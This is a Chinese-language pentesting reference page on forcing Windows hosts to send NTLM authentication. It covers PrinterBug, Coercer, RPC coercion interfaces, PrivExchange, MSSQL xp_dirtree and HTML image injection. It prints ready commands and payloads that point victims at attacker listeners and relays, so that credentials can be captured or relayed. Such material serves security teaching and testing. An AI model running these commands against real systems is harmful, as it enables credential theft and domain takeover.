# 强制 NTLM 特权 Authentication

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) 是一个使用 MIDL compiler 以 C# 编写的 **remote authentication triggers** **collection**，用于避免依赖 third-party dependencies。

## Spooler Service Abuse

如果 _**Print Spooler**_ service **enabled，**你可以使用一些已知的 AD credentials，向 Domain Controller 的 print server **request** 新 print jobs 的 **update**，然后告诉它将通知**发送到某个 system**。\
注意，当 printer 将通知发送到 arbitrary systems 时，它需要对该 **system 进行 authenticate**。因此，attacker 可以使 _**Print Spooler**_ service 对 arbitrary system 进行 authenticate，而该 service 会在此次 authentication 中**使用 computer account**。

在底层，经典的 **PrinterBug** primitive 通过 `RpcRemoteFindFirstPrinterChangeNotificationEx` over **`\\PIPE\\spoolss`** 实现 abuse。attacker 首先打开一个 printer/server handle，然后在 `pszLocalMachine` 中提供一个伪造的 client name，使 target spooler 创建一个**返回 attacker-controlled host** 的 notification channel。这就是其效果属于 **outbound authentication coercion** 而不是直接 code execution 的原因。<sup>[[2]](#references)</sup>\
如果你正在寻找 spooler 本身的 **RCE/LPE**，请查看 [PrintNightmare](printnightmare.md)。本页面专注于 **coercion and relay**。

### 在 domain 中查找 Windows Servers

使用 PowerShell 列出 Windows hosts。Servers 通常是优先级最高的 targets，因此应首先关注它们：
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### 查找正在监听的 Spooler 服务

使用经过略微修改的 @mysmartlogin（Vincent Le Toux）的 [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket)，检查 Spooler Service 是否正在监听：
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
你也可以在 Linux 上使用 `rpcdump.py`，并查找 **MS-RPRN** protocol：
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
或者使用 **NetExec/CrackMapExec** 从 Linux 快速测试主机：
```bash
nxc smb targets.txt -u user -p password -M spooler
```
如果你想要**枚举 coercion surfaces**，而不只是检查 spooler endpoint 是否存在，请使用 **Coercer scan mode**：<sup>[[5]](#references)</sup>
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
这很有用，因为在 EPM 中看到 endpoint 只能说明 print RPC interface 已注册。它**并不**保证在你当前的 privileges 下每种 coercion method 都可访问，也不保证该主机会发出可用的 authentication flow。

### 要求该服务向任意主机进行 authentication

你可以从[这里](https://github.com/NotMedic/NetNTLMtoSilverTicket)编译 [SpoolSample]。
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
或者，如果你使用的是 Linux，可以使用 [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) 或 [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
使用 **Coercer**，你可以直接针对 spooler 接口，从而避免猜测暴露了哪个 RPC 方法：<sup>[[5]](#references)</sup>
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### 使用 WebClient 强制使用 HTTP 而非 SMB

经典的 **PrinterBug** 通常会向 `\\attacker\share` 发起 **SMB** authentication，这对于 **capture**、**relay to HTTP targets**，或在缺少 **SMB signing** 的情况下进行 **relay** 仍然很有用。\
但是，在现代环境中，**SMB to SMB** relay 经常会被 **SMB signing** 阻止，因此 operators 通常更倾向于强制使用 **HTTP/WebDAV** authentication。

如果目标正在运行 **WebClient** service，可以使用一种特定格式指定 listener，使 Windows 通过 **HTTP** 使用 **WebDAV**：
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
当与 **`ntlmrelayx --adcs`** 或其他 HTTP relay targets 组合使用时，这尤其有用，因为它不依赖被强制连接是否支持 SMB relay。需要注意的重要事项是：HTTP/WebDAV variant 要正常工作，victim 上必须运行 **WebClient**。

### Combining with Unconstrained Delegation

如果 attacker 已经 compromise 了一台配置为 [Unconstrained Delegation](unconstrained-delegation.md) 的 computer，就可以**强制 printer 向该 computer 进行 authentication**。随后，printer computer account 的 **TGT** 会缓存在 unconstrained-delegation host 的内存中，attacker 可以使用 [Pass the Ticket](pass-the-ticket.md) 获取并复用该 TGT。

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### RPC UNC-path coercion matrix (interfaces/opnums that trigger outbound auth)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Notes: 同一 spooler pipe 上的 asynchronous print interface；使用 Coercer 枚举指定 host 上可访问的方法<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (also via \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce<sup>[[1]](#references)</sup>

注意：这些 methods 接受可携带 UNC path 的 parameters（例如 `\\attacker\share`）。处理这些 parameters 时，Windows 会以 machine/user context 向该 UNC 进行 authentication，从而实现 NetNTLM capture 或 relay。\
对于 spooler abuse，**MS-RPRN opnum 65** 仍然是最常见且文档最完善的 primitive，因为 protocol specification 明确说明，server 会向 `pszLocalMachine` 指定的 client 创建 notification channel。<sup>[[2]](#references)</sup>

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: MS-EVEN over \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Effect: target 会尝试打开所提供的 backup log path，并向 attacker-controlled UNC 进行 authentication。<sup>[[1]](#references)</sup>
- Practical use: 强制 Tier 0 assets（DC/RODC/Citrix/etc.）发出 NetNTLM，然后 relay 到 AD CS endpoints（ESC8/ESC11 scenarios）或其他 privileged services。<sup>[[1]](#references)</sup>

## PrivExchange

`PrivExchange` attack 源于 **Exchange Server `PushSubscription` feature** 中发现的 flaw。该 feature 允许任何拥有 mailbox 的 domain user 强制 Exchange server 通过 HTTP 向任意 client-provided host 进行 authentication。

默认情况下，**Exchange service 以 SYSTEM 身份运行**，并被授予过高的 privileges（具体而言，在 2019 Cumulative Update 之前，它拥有域上的 **WriteDacl privileges**）。该 flaw 可被利用来启用向 LDAP 的 **relaying**，随后 extract domain NTDS database。如果无法 relay 到 LDAP，该 flaw 仍可用于 relay 并向 domain 内的其他 hosts 进行 authentication。成功利用此 attack 后，任何 authenticated domain user account 都可立即获得 Domain Admin access。

## Inside Windows

如果你已经进入 Windows machine，可以使用 privileged accounts 强制 Windows 连接到 server：

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
或者使用这一其他 technique：[https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

可以使用 certutil.exe lolbin（Microsoft-signed binary）来强制 NTLM authentication：
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### 通过 email

如果你知道登录到想要攻陷的机器的用户的 **email address**，你可以直接向他发送一封包含 **1x1 image** 的 **email**，例如
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
当受害者打开它时，Windows 会尝试进行身份验证。

### MitM

如果你能够执行 MitM attack，并将 HTML 注入受害者查看的页面中，可以尝试注入如下图像：
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## 强制和 phishing NTLM authentication 的其他方法


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Cracking NTLMv1

如果你可以捕获 [NTLMv1 challenges，请在此处阅读如何 crack 它们](../ntlm/index.html#ntlmv1-attack)。\
_请记住，要 crack NTLMv1，你需要将 Responder challenge 设置为 "1122334455667788"_

## References

- [1] [Unit 42 – Authentication Coercion 不断演进](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
{{#include ../../banners/hacktricks-training.md}}
